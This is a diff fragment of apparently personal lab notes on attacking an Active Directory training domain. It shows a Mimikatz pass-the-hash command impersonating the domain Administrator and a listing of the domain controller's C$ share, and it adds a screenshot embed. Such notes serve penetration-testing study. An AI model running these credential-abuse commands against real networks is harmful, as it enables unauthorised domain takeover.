@@ -493,4 +493,5 @@ Invoke-Mimi -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:
 ```powershell
 ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
 ```
+![[Pasted image 20231025115506.png]]
 
